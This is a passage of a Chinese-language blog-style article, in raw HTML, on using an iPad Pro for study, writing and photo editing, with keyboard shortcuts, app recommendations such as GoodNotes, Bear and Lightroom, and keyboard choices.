data-size=\"normal\" data-rawwidth=\"4951\" data-rawheight=\"3301\" class=\"origin_image zh-lightbox-thumb\" width=\"4951\" data-original=\"https://pic1.zhimg.com/v2-9386245f7931aea2bd419830c03a6d58_r.jpg\"></figure><p>比如，我们在使用「文件」时，就可以直接按下 Command 看到各种快捷键。为了让你快速上手，所以在这里我提供了几个常用全局快捷键：</p>\n<ul>\n<li>Command + Tab ：多任务切换</li>\n<li>Command + 空格 ：快速搜索</li>\n<li>Command + H：返回桌面</li>\n<li>Command + N：新建（文件）</li>\n<li> +A ：显示 / 隐藏 Dock</li>\n<li> +⬆️：多任务后台（ +↔️ 切换任务）</li>\n</ul>\n<p>熟练以上几个快捷键后，基本上就可以不用抬手，使用妙控键盘的触控板和键盘就可以完成 iPad Pro 的分屏及各类操作。</p>\n<p>当然，快捷键操作在任意外接键盘上都有效，不仅仅是妙控键盘。</p>\n<p><b>Apple Pencil 下的快速笔记</b></p>\n<p>如果你的 iPad Pro 是 Apple Pencil 为核心，那么速记功能一定是你的需求之一。</p>\n<p>息屏状态下拿起 Apple Pencil 点击屏幕可以快速进入备忘录，不需要额外解锁打开备忘录的操作。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-77c3a1624c5b884a0d5f70068db75d8f_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1422\" data-rawheight=\"800\" data-thumbnail=\"https://pic4.zhimg.com/v2-77c3a1624c5b884a0d5f70068db75d8f_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1422\" data-original=\"https://pic4.zhimg.com/v2-77c3a1624c5b884a0d5f70068db75d8f_r.jpg\"></figure><p>在 iPad 任意界面，从右下角向左上方滑动，就可以呼出快速备忘录。这一步甚至无需使用 Apple Pencil。快速备忘录记录的内容也很多样，可以直接将正在浏览的网页地址一键插入备忘录，然后再做各种摘录。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-1388733fa9fccac469c3057c444f2505_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1422\" data-rawheight=\"800\" data-thumbnail=\"https://pic2.zhimg.com/v2-1388733fa9fccac469c3057c444f2505_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1422\" data-original=\"https://pic2.zhimg.com/v2-1388733fa9fccac469c3057c444f2505_r.jpg\"></figure><p>这两个操作可以保证你在任何情况下以最快速度开始记录。而且现在的备忘录文字识别功能异常强大，只要你的笔迹不是过于潦草，系统都可以自动识别文字。尤其是一长串的数字，都可以直接复制粘贴。</p>\n<p>所以这也带来另一个功能，在 iPad 的全局任何一个输入框都可以直接通过手写文字的形式直接输入。比如着急回一个微信，身边还没键盘，直接在输入框上写几笔即可。</p>\n<p>在细分的工作流之前，我先来回答一些具体的问题：</p>\n<p><b>1. 软件下载：</b>如果我没有特别说明，那么这些软件都可以在国区 App Store 下载。如果需要跨区下载，我会特别标注，如果收费政策比较苛刻我也会注明。</p>\n<p><b>2. 付费：</b>虽然 2021 年，大家对于软件付费应该习惯了，但是依然会有人对于「我用一个软件还要付费」来质疑。也恳请大家不要乱评价一个软件的收费标准，因为对于效率和专业软件来说价值往往取决于使用者本身。</p>\n<p>那么正式进入具体工作流。</p>\n<h3>学习</h3>\n<p>iPad 绝对是最好的学习工具。这种学习不仅仅是对于各位在校生，只要你是不断吸收新事物，iPad 都可以帮助你更好的学习。在这里的学习并不单纯的只获取知识，任何对于「头脑」的输入，都是一种学习。比如因为我的工作之一就是摄影，所以获取灵感也是我学习的一种方式。<br></p>\n<p>所以，iPad 在我的学习过程中有三个非常重要的作用：收集、汇总、归纳。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-a9c8c0b6eb9737e681c8288783ac8bce_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic3.zhimg.com/v2-a9c8c0b6eb9737e681c8288783ac8bce_r.jpg\"></figure><p>收集是指一切形式的知识内容寻找，比如对于平面摄影，我最常用的灵感收集软件就是 Instagram 和 Pinterest。</p>\n<p>Instagram 不用说了，完全以图片为核心的社交平台。我基本上使用 Instagram 的唯一目的就是看看国外摄影师都在拍什么。</p>\n<p>但是我们都知道 Instagram 是没有 iPad 版软件的。但是没有关系，这里有一个小知识，这就是每一个网页是可以直接作为应用在桌面上。只要我们在 Safari 中访问 Instagram 网页，登录以后添加到桌面上，这样每次都可以像一个应用一样，直接在桌面上打开。</p>\n<p>使用 iPad 版 Instagram 的好处就是图片更大，细节也就相对更丰富。摄影师都知道，很多时候尺寸决定一切，一张图的观感和尺寸有着非常明显的关联。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-9c62cb501a7137b389cb1b78a72bd1f3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-9c62cb501a7137b389cb1b78a72bd1f3_r.jpg\"></figure><p>所以同理 Pinterest 也是如此。不过好在 Pinterest 是有软件的，所以使用起来就更加方便的。对于摄影师和设计师来说，我想 Pinterest 都很熟悉了，所以也就没有必要过多的介绍。</p>\n<p>如果遇到不错的照片，很多时候我就会直接下载下来，保存到 iPad 中，这样可以方便我随时观看。这里还有一个很重要的技巧：</p>\n<p>截屏并标记。</p>\n<p>比如你在看视频过程中遇到一些你认为很必要的知识点，或者是遇到很不错的照片想要保存，我的建议就是直接快速截屏。截屏之后可以用 Apple Pencil 标记。尤其是如果是一些关于激发的灵感，那么还可以写下来自己的一些感受。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-d7f0a595075c5968c7f1e0ffca824ed7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-d7f0a595075c5968c7f1e0ffca824ed7_r.jpg\"></figure><p>最后切记千万不要直接存储到相册里，因为这样你可能再也不会去看它了。所以最好的方式是直接存储到文件中的一个特定文件夹。比如我会建一个灵感的文件夹。专门存储这些我收集的碎片。</p>\n<p>当然视频网站也是一个很好的学习途径。</p>\n<p>基本上我主要看的是 Youtube 以及 B 站。提到 Youtube 就不得不说起科学上网，但显然我无法在这里分享具体的方式。但是 iPad 科学上网本质和 iPhone 一样，我也只能说这么多了。</p>\n<p>在通过上述的途径收集以后，接下来就是汇总。</p>\n<p>这里最常见需要汇总的资料就是 PDF 以及各种文档。那我最为推荐的软件有两个：</p>\n<p>如果你更多是单纯阅读，同时做少量的批注，那么我推荐你使用 PDF Expert ，这款软件基本上能够实现 PDF 的所有功能。</p>\n<p>如果你是书写和摘录为主，那么我建议你使用 GoodNotes，因为它本身就是一个笔记软件，可以让你有在 PDF 的书写上有着最丰富的体验。这也是我自己最为常用的汇总软件，许多摄影课程都会有 PDF 总结，尤其是一些国外的摄影师。我使用 GoodNotes 因为文件夹可以很丰富，所以我可以直接一目了然的进行管理。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-b9b5d5a05c623a31ba6556b7702ffea1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-b9b5d5a05c623a31ba6556b7702ffea1_r.jpg\"></figure><p>当然如果是视频资料的汇总，肯定就涉及到播放器的问题。我在 iPad 上使用最多的播放器是 VLC，基本上所有的格式都能够播放，而且也支持外挂字幕，对于多语言学习的用户还是非常友好的。</p>\n<p>最后就是归纳。这里的归纳是指在现有的资料中提取精髓部分，比如最为直接的笔记。</p>\n<p>说到记笔记，我觉得也就没有什么可以说的了，GoodNotes 以及 Notability 这两个软件可以说人尽皆知。选择哪一个都没有什么问题，都一样好用，只不过我自己可能更喜欢  GoodNotes。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-2b43dc0b33bb79face41de48c633e85b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-2b43dc0b33bb79face41de48c633e85b_r.jpg\"></figure><p>除了单纯地誊写，我也认为制作思维导图也十分有用，它可以让我们从全局来思考。比如这篇文章在构思之前我就使用 MindNode 来构思了一个思维导图。我一直都很喜欢 MindNode，一方面它的使用方式非常简洁，另一方面颜值很高，可以直接加入到各种类型的展示中去。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-e714123d6fff12ab57ce73dd7a00fd86_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic3.zhimg.com/v2-e714123d6fff12ab57ce73dd7a00fd86_r.jpg\"></figure><p>除了 MindNode 以外，还有一款非常「学生向」的学习工具：MarginNote 3。</p>\n<p>这款软件可以说是完全重塑了学习方法，它有着你学习所有需要的工具。一方面它可以识别各类文档内容，让你快速建立思维导图。另一方面它还能直接在文件中绘制，添加备注书签。</p>\n<p>总之，它是一款值得你完全信任的纯粹学习工具，对于任何正在上学，并且伴随着大量电子文档的学生可以说是上佳的选择。</p>\n<p>都说学无止境，以前只是觉得鸡汤而已。工作几年，愈发明白「学习能力」往往就是决定事业上限。放眼望去，iPad 配合 Apple Pencil 这个组合，可以说是最好的学习工具，一定不为过。你想在学习领域找到一个与之匹敌的产品，还真的没有。</p>\n<h3>写作</h3>\n<p>我觉得 iPad 是最好的写作工具。</p>\n<p>这里的写作不是指「单纯的码字」，也不是指「文字的输出和排版」，而是纯粹的文字创作。最直接的例子就是各类作家或者是说写手。我身边认识的几个编剧，基本上都在使用 iPad 写作。从我自身的经验来看，iPad 之所以受到越来越多的写作者的追捧最重要的原因它能够让写作者保持专注。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-ede3e925f59389cc920c7fe0ddb7d07b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-ede3e925f59389cc920c7fe0ddb7d07b_r.jpg\"></figure><p>正如前面所说，在使用 iPad Pro 写作时，iPadOS 专注于某一个软件的特性反而成为了一种优势。</p>\n<p>我自己的写作工作流主要包含输入和输出两个部分。</p>\n<h3>输入：获得灵感</h3>\n<p>这里基本上就是指我自己的文字内容消费。</p>\n<p>我自己是不太喜欢今天「依托社交网络」的碎片阅读方式，所以 iPad Pro 对我来说输入方式基本上杂志为主。</p>\n<p>基本上如果你愿意，今天大部分的杂志都可以寻找到电子版。我说 iPad 是最好的电子杂志阅读器应该是没有人反对的。尤其是杂志图文混排的形式，iPad 才能更好的呈现。</p>\n<p>而且一些经典杂志，在 iPad 上都是有订阅的。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-de6fb6d66bdf3b95742820d967859529_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-de6fb6d66bdf3b95742820d967859529_r.jpg\"></figure><p>比如我自己就是在英区的 App Store 上订阅了《New Yorker》和《Wired》。另一方面有一些千奇百怪的杂志也是可以各种方式获得，这里我也就不讨论盗版不盗版的问题了。我的看法就是：</p>\n<p>能交费的我统统买正版，没有交费渠道的看了也不是什么罪过，都是学习。</p>\n<h3>输出：写作软件</h3>\n<p>别再用 Word 写作了。</p>\n<p>尤其是如果你的工作是创意类型的文字输出，就千万不要使用 Word。我们需要知道的 Word 仅仅是一个文档排版软件。它的作用是提供一个文件为单位的文档规格。它的目的是一个一个文件，并不是一篇一篇的文章。</p>\n<p>而且它最大的意义是「整理文字」，也就是调整文章格式，所以这就让它的功能非常复杂。这种复杂其实会分散我们的注意力。但是对于写作过程来说，什么都不需要，你只需要：</p>\n<p>写出来。</p>\n<p>所以这里就需要一些沉浸感很好的写作软件，了解我的人都知道我肯定是首推 Bear（熊掌记）。这篇文章就是我在熊掌记上完成的。</p>\n<p>虽然 Bear 给自己定位是笔记软件。这里的笔记特别说的是文档笔记而不是手写笔记。但是这款软件在写作沉浸度上可以说是绝对最佳。它非常简洁，整个软件由三个核心部分组成：分别是文件夹边栏、标题边栏以及写作窗口。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-cd010d67956737dc0693ecb186e01ff5_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-cd010d67956737dc0693ecb186e01ff5_r.jpg\"></figure><p>这款软件的好处就是：</p>\n<p><b>1. 颜值极高</b></p>\n<p>整个软件设计审美非常高，简洁而优雅。你可以自由选择已经内置好的主题，我自己最喜欢的主题就是「光天化日」。是的，这款软件的主题名字就是这么的中二。</p>\n<p><b>2. 随开随用</b></p>\n<p>这也是此类写作软件沉浸感的重要来源。当我们使用 Word 写作时，我们需要建立一个文件的过程。一开始要新建，最后还需要保存。但是熊掌记完全没有所谓的文件概念，只要你点进去就可以开始写，不想写了合上 iPad 即可。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-7d45044f5a6c7291fad4bcaff6e5715b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-7d45044f5a6c7291fad4bcaff6e5715b_r.jpg\"></figure><p><b>3. 完全基于 iCloud 的跨设备云同步</b></p>\n<p>你可以在苹果生态的 Mac、iPhone 中下载熊掌记。而且所有写作进度完全同步。所以你可以在手机上记下自己的灵光一闪，然后回到家在 iPad 或者 Mac 上继续完善。</p>\n<p><b>4. 基于 Markdown 语言的全格式输出</b></p>\n<p>如果你经常大量写作，但是还不知道 Markdown 语言，我建议你可以花点时间了解一下，这里我就不赘述了。但是需要说明的是，熊掌记在完成写作以后只能简单的排版工作。如果你需要更加复杂的排版，那么可以按照你需要的格式进行输出，比如 Word。</p>\n<p>这也是我自己写作工作流中最为重要的一个核心：<b>写排分离。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-20b60f43ad07c23282fe17e4e2dfa249_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-20b60f43ad07c23282fe17e4e2dfa249_r.jpg\"></figure><p>写作的时候，只是纯粹的写作，排版的时候，就纯粹的排版。</p>\n<p>当然我知道对于大多数人来说还是习惯用 Word。所以这里就简单来说说 Office 。经过几年的演变，iPad 版 Office 三件套已经逐步成熟。尤其是 Word 和 PowerPoint，基本上可以满足大部分需求。</p>\n<p>但如果你的工作就是在 Word 中排版，那么显然 iPad 不适合你，老老实实用电脑。</p>\n<p>Excel 简单地看看表还可以，但类似数据透视这类功能依然无法实现。我自己是订阅了 Office 365，当然也有相对性价比的选择就是 WPS。iPad 版本的 WPS 整体完成度还是极高的，很大程度上能够还原桌面端的功能。</p>\n<p>所以如果你并不想在办公软件上花太多钱，WPS 也是一个很好的选择。</p>\n<h3>选个好键盘</h3>\n<p>除了软件，我自己的一个重要经验是，选择一块好的键盘也是关键。</p>\n<p>好消息是，现在 iPad 几乎兼容任何形式的键盘。蓝牙键盘就不用说了，直接配对就可以使用。有线键盘也可以通过 USB-C 转 USB-A 的转接线来使用。所以如果你的写作原有习惯的键盘都可以在 iPad 上沿用。</p>\n<p>我自己其实折腾过很多键盘，甚至是以 iPad 为核心写过一个键盘推荐指南。因此在这里我不再推荐具体的键盘，而是直接分为两种形式。</p>\n<p><b>外接键盘</b></p>\n<p>外接键盘最大的好处就是可以按需挑选。无论你喜欢什么样的键盘，都可以自己选择。对于一个常年码字的人来说，肯定是有自己的键盘偏好的。</p>\n<p>我自己是逐渐的从机械键盘过渡到 HHKB 静电容的。一开始我可能更加注重的是一种所谓的快感，但是慢慢的你会发现疲劳度是一个非常重要的参考指标。而静电容我觉得整体手感就会非常温柔，与此同时还能保证一定的打字快感，是一个很好的平衡。而且 HHKB 的键盘布局更加紧凑，整体的造型复古好看。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-bbe11bef5bc7832886e159a7f49581c9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-bbe11bef5bc7832886e159a7f49581c9_r.jpg\"></figure><p>有人说 HHKB 是烧键盘的终点，一开始以为是戏谑，不过现在我还真的再也没有对其它任何一款键盘心动过。</p>\n<p>所以，如果让我来推荐一款外接键盘的话，我还是推荐 HHKB。</p>\n<p>当然如果你觉得 HHKB 价格高昂，市面上的键盘选择还是非常多的。你可以直接看相关的键盘推荐。</p>\n<p>不过当你使用外接键盘时，就需要注意你使用的场景将会非常固定。这种固定并不是一定要坐在某一个地方不动，而是说你的使用场景不是动态的。比如去咖啡厅写作，那么一块 HHKB 是不错的选择。但是如果你是出差，或者是参加各种会议，那么 HHKB 就会各种不便利。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-d048b552e7b029b755fe0c8b796f37ed_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-d048b552e7b029b755fe0c8b796f37ed_r.jpg\"></figure><p>所以只有当你确定自己的写作场景是很固定时，才能主动选择外接键盘。</p>\n<p><b>妙控键盘</b></p>\n<p>一开始我对于妙控键盘并不感冒，这种不感冒有很多原因，有价格的因素，有手感的因素。但是用着用着慢慢发现，想要高效使用 iPad，尤其是移动场景居多时，妙控键盘真的是最好的选择。</p>\n<p>想用的时候，它都在。我不是没有尝试过带着 HHKB 出差，但是总是会遇到我想写但是 HHKB 在包里、行李箱里、酒店里。总之，就是不在身边。但是妙控键盘，因为保护壳的设计，所以无论任何时候只要你想用 iPad 开始写，键盘就在。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-678c2edaa64f650f6bc75f6681963c9b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-678c2edaa64f650f6bc75f6681963c9b_r.jpg\"></figure><p>触控板的确会提升效率。如果你使用其它外接键盘，很多操作依然要配合触屏来完成，这样的抬手操作还是会累。使用妙控键盘的触控板就可以彻底不需要抬手操作，减轻不少压力。所以，如果你的工作是动的多，也不要觉得妙控键盘贵不贵的问题，就认为它是 iPad 的一部分就好了。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-49c93d221f57479df7d6a5fe1aaddb1d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic2.zhimg.com/v2-49c93d221f57479df7d6a5fe1aaddb1d_r.jpg\"></figure><p>关于写作，就先说这么多。</p>\n<p><b>影像创作</b></p>\n<p>在这里，我原本的题目是摄影。但是因为现在视频内容成为了重要的媒介语言，并且目前我们团队也有视频内容的输出，所以这里使用影像更为合适。</p>\n<p>其实对我的摄影工作来说，输入同样非常重要的环节，不过我已经在前面的「学习」部分有所分享，在这里也就不再赘述了。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-205341ce625f94438538b4e95c64db14_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"4864\" data-rawheight=\"3243\" class=\"origin_image zh-lightbox-thumb\" width=\"4864\" data-original=\"https://pic1.zhimg.com/v2-205341ce625f94438538b4e95c64db14_r.jpg\"></figure><p>不过虽然把照片和视频放在一个章节里，但是这两件事有着各自完全不同的工作流。而且从我的实际使用来看，两个工作流在 iPad 上目前的完成度也不相同。</p>\n<p>目前平面图片在 iPad 上已经可以完成整个工作流，没有任何环节缺失，仅仅是效率高低。但「视频制作」，iPad 目前只能完成某一个或者是某几个环节。但这并不是说 iPad 对于视频工作流不重要，恰恰相反，它也是我视频制作不可或缺的一部分。</p>\n<p>我们先从平面摄影开始吧。</p>\n<p>常规摄影工作流主要分为以下的几个步骤：</p>\n<p><b>素材转移</b></p>\n<p>这是整个 iPad 最为容忽略的环节。在一开始 iPad 只能把所有的图片文件导入到相册中。但是随着文件 App 出现，我们终于可以把所有图片以文件形式直接导入 iPad。连接 SD 卡以后，我们打开文件 App 就可以看到对应的盘。目前文件 App 的兼容度不错，主流相机的 Raw 格式都可以在 app 内直接浏览。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-3562e02e6160bbade70ddf6abf82fa44_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"8192\" data-rawheight=\"5464\" class=\"origin_image zh-lightbox-thumb\" width=\"8192\" data-original=\"https://pic1.zhimg.com/v2-3562e02e6160bbade70ddf6abf82fa44_r.jpg\"></figure><p>不过目前最大的问题在于文件 App 本身十分混乱的机制。尤其是我很难理解，为什么 iPad 文件 app 中的「拷贝」操作是在原地再复制一份，而要把外接存储设备中的文件复制粘贴到 iPad 上，正确的操作应该是「移动」，虽然这个名字听起来很像「剪切」操作，但外接存储设备上的文件并不会因为「移动」而消失。</p>\n<p>所以在使用你的 iPad 连接了键盘，在文件 App 中管理照片时，最好的使用方式是使用快捷键。比如当你想把 SD 卡中的素材拷进 iPad 时，请一定要使用 「Command+A」首先全选，然后直接「Command+C」复制，最后找到你 iPad 中对应想要选择的文件夹以后，「Command+V」粘贴。</p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-7492f1fb8050310e1b52dda9f7a4aeef_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"8192\" data-rawheight=\"5464\" class=\"origin_image zh-lightbox-thumb\" width=\"8192\" data-original=\"https://pic4.zhimg.com/v2-7492f1fb8050310e1b52dda9f7a4aeef_r.jpg\"></figure><p>这里我想要特别强调一下。最好的素材管理方式一定是用读卡器连接 iPad 拷贝素材，虽然 iPad 可以直连一些主流相机，并从中直接读取照片，但是这样的素材传递形式很容易出现错误和丢素材的情况。所以一定要买对应存储卡的 USB-C 读卡器，现在也不贵了，百元左右就有很多选择。</p>\n<p>对了，我需要特别强调一点这就是文件 App 终于出现了「进度条」。这个在 macOS 上非常基础的功能，终于来到了 iPad 上。所以当我们在拷贝 SD 卡中的素材时，可以直接通过观察这个进度条来判断进展。而且重要的是，这个进度条是可以点击的。点击之后可以查看具体的拷贝时间，以及最为关键的可以「中断拷贝」。</p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-7b529b4cfee8af963baa42291b81da58_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-7b529b4cfee8af963baa42291b81da58_r.jpg\"></figure><p>特别强调，这是在 iPadOS 15 中才有的功能，如果你没有升级到最新系统，那么依然要忍受拷贝文件时没有进度条的问题。</p>\n<p><b>素材筛选</b></p>\n<p>每个摄影师都有自己的素材管理方式。</p>\n<p>但基本上图片的核心管理肯定是使用 Lightroom 完成的。Lightroom 对于职业摄影师肯定是再熟悉不过的。</p>\n<p>不过在进入软件之前，我想花点时间来和大家说说怎么获得 Lightroom。</p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-a78d2c5c22b501a7cb93dcd04646f6d1_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-a78d2c5c22b501a7cb93dcd04646f6d1_r.jpg\"></figure><p>你可以直接在国区 App Store 免费下载 iPad 版 Lightroom，如果你想要解锁所有的功能，需要最低 15 元/月的订阅费用。当然，对于 Lightroom 这么好用的软件，并不昂贵。</p>\n<p>但是如果你在中国大陆以外的国家或地区订阅了 Adobe 摄影师计划，那么其实这个计划中是包含了 iPad 版 Lightroom 和 Photoshop 的，也就是说你无需再次付费即可解锁 iPad 版的所有功能，包括 1TB 的云存储空间。</p>\n<p>由于我在购买 Adobe 的 Lightroom 和 Photoshop 套装时，国内还没有上线，所以我在其它地区购买了 Adobe 摄影师计划。因此我就可以直接在 iPad 上登录 Adobe 账号，这样就可以免费使用，并且实现云同步。</p>\n<p>再次强调，中国大陆的 Adobe 摄影师计划并不包含 iPad 版本 Lightroom 和 Photoshop。具体资费政策我就不在这里多阐述，大家可以在 Adobe 官网查询。</p>\n<p>那么我们继续回到软件本身。</p>\n<p>iPad 版 Lightroom 和电脑端 Lightroom Classic 实现的功能基本一致。只需探索一下界面即可。</p>\n<p>我们可以直接通过在 Lightroom 主界面右下角的导入按钮，导入我们的任意文件夹。导入后直接点击单张图片，右下角就有「标记」功能。也就是摄影师们熟知的「星级」评定。</p>\n<p>如果你使用键盘操作，依然可以直接点按数字来完成星级评定。</p>\n<p>如果是手势操作，iPad 版的 Lightroom 也有一个手势操作快捷方式：<b>左侧上下滑动做星级评定，右侧上下滑动标记旗标。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-13c172472358314de52b33c1e0b629a0_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1422\" data-rawheight=\"800\" data-thumbnail=\"https://pic1.zhimg.com/v2-13c172472358314de52b33c1e0b629a0_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"1422\" data-original=\"https://pic1.zhimg.com/v2-13c172472358314de52b33c1e0b629a0_r.jpg\"></figure><p>不过唯一可惜的是没有颜色区分，少了一种评定方式。不过从实际使用来看，这两种评定方式也可以完成核心图片筛选环节了。</p>\n<h3>图片编辑</h3>\n<p>筛选以后，就可以直接进入修图步骤了。</p>\n<p>iPad 版 Lightroom 的功能和基本和桌面端一致。唯一不同的是，缺少了一些很多摄影师习惯的键盘快捷键。但是 iPad 版也有一项独家优势：<b>Apple Pencil。</b></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-079264dd693151892942a4845e25cc50_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-079264dd693151892942a4845e25cc50_r.jpg\"></figure><p>而 Apple Pencil 此时基本上就可以完全化身数位笔。这对一些进阶修图用户，尤其是擅长局部调整的摄影师们来说绝对是大好消息。比如在画笔工具中，就可以利用 Apple Pencil 在图片区域中进行更加精细的选择，这是电脑端需要配合数位板才能完成的操作。</p>\n<p>而现在 iPad 上却有更加直观的操作。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-b0d435cad4c44a236ca1a99ef77826b2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"8192\" data-rawheight=\"5464\" class=\"origin_image zh-lightbox-thumb\" width=\"8192\" data-original=\"https://pic3.zhimg.com/v2-b0d435cad4c44a236ca1a99ef77826b2_r.jpg\"></figure><p>对于摄影后期来说，Lightroom 只是能完成一部分，更多内容需要到 Photoshop 中才能继续。在桌面端我们知道，Lightroom 是可以直接跳转到 Photoshop 的。而在 iPad 上：</p>\n<p>Lightroom 依然可以跳转到 Photoshop。</p>\n<p>不过，等等。</p>\n<p>需要说明的是，这里的 Photoshop 是指 Adobe 完全为 iPad 设计的，而不是那个叫做 Photoshop Express 的「小玩具」。但是目前 Photoshop 在国区 App Store 并且上架。只有在其它区的 App Store 才能下载，它的付费情况和 Lightroom 类似。</p>\n<p>我们可以直接在 Lightroom 的分享按钮中选择跳转到 Photoshop，它就会直接转换为 PSD 格式并在 Photoshop 中打开。</p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-6b37c072643f64f7794b608787608ffe_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"5088\" data-rawheight=\"3392\" class=\"origin_image zh-lightbox-thumb\" width=\"5088\" data-original=\"https://pic3.zhimg.com/v2-6b37c072643f64f7794b608787608ffe_r.jpg\"></figure><p>基本上目前 iPad 版本的 Photoshop 核心功能已经完备，更多桌面端端功能都在逐步向 iPad 端迁移。目前的功能已经可以完全满足的我自己的修图需求，笔刷系统、调整系统、选择系统都在。而且基本上也延续了 Photoshop 的主流快捷键。在我自己的使用过程中，常见的例如「中性灰」手法，都可以流畅的在 iPad 上实现。</p>\n<p>而且由于 Photoshop 修图更是一个依赖笔刷工具的过程，所以 Apple Pencil 的作用甚至是比在 Lightroom 中还大，基本上代替了数位板的作用。</p>\n<p>不过这里也插一句题外话，由于 Photoshop 基本上也是很多插画师的选择，但我完全不建议你使用 iPad 版 Photoshop 来画插画。因为有更好更先进的选择，这就是 Procreate。</p>\n<p>的确要承认，iPad 版本 Photoshop 